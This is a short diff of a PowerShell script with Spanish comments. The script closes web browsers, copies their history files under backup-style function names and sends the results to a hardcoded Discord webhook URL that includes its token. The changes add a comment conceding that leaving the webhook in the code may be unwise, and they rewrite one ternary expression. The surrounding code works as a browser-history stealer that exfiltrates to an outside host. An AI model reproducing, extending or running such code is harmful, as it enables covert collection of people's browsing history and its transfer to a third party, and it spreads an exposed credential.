@@ -13,7 +13,7 @@ Cierra navegadores, copia sus archivos de historial y envía los resultados a un
 
 # Configuración del Webhook de Discord
 $discordWebhookUrl = "https://discord.com/api/webhooks/1348379829598163038/BBTDV8jHgoMyF4sNPi2L_IyAZSsbmrtyuhE7VCAMiT0PVuTPTF-_OqDkWjPfDvC5YBkP"
-
+#tal vez no sea buena idea dejar esto aqui
 function Initialize-BackupEnvironment {
     <#
     .SYNOPSIS
@@ -170,7 +170,7 @@ $backupResults | Format-Table -AutoSize
 # 4. Enviar resultados a Discord
 $message = "Historiales recolectados:`n"
 $message += $backupResults | ForEach-Object {
-    "$($_.Browser): $($_.Success ? 'Éxito' : 'Error') - $($_.FilePath)"
+    "$($_.Browser): $(if ($_.Success) {'exito'} else {'Error'}) - $($_.FilePath)"
 } -join "`n"
 
 Send-ToDiscord -WebhookUrl $discordWebhookUrl -Message $message
